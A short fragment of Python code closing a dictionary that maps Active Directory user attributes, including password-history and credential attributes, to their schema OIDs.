    'userPrincipalName': '1.2.840.113556.1.4.656',
    'sAMAccountName': '1.2.840.113556.1.4.221',
    'unicodePwd': '1.2.840.113556.1.4.90',
    'dBCSPwd': '1.2.840.113556.1.4.55',
    'ntPwdHistory': '1.2.840.113556.1.4.94',
    'lmPwdHistory': '1.2.840.113556.1.4.160',
    'supplementalCredentials': '1.2.840.113556.1.4.125',
    'objectSid': '1.2.840.113556.1.4.146',
    'pwdLastSet': '1.2.840.113556.1.4.96',
    'userAccountControl': '1.2.840.113556.1.4.8',
}
